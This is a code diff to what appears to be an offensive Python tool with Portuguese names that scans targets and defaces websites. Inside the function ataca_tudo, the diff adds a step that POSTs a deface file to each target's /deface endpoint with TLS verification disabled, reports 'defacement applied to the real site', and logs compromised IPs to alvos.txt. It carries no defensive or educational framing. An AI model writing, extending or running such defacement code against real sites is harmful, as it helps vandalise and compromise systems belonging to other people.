@@ -7,6 +7,7 @@ import socket
 import re
 import time
 import subprocess
+import requests
 
 # Bridges
 from bridge_re import pe_analise, detecta_packer, tira_strings
@@ -516,6 +517,16 @@ def ataca_tudo():
             
             aplica_deface(ip_alvo, porta_web_real, deface_file)
             print("[+] DEFACE APLICADO!")
+
+            # Depois de aplicar o deface
+            with open(deface_file, "r") as f:
+                deface_content = f.read()
+            try:
+                requests.post(f"https://{ip_alvo}:{porta_web_real}/deface",
+                              data=deface_content, verify=False, timeout=5)
+                print("[+] DEFACE APLICADO NO SITE REAL!")
+            except:
+                print("[!] Falha ao aplicar deface no site real")
             
             with open("alvos.txt", "a") as f:
                 f.write(f"\n[SITE_COMPROMETIDO] {ip_alvo}\n")
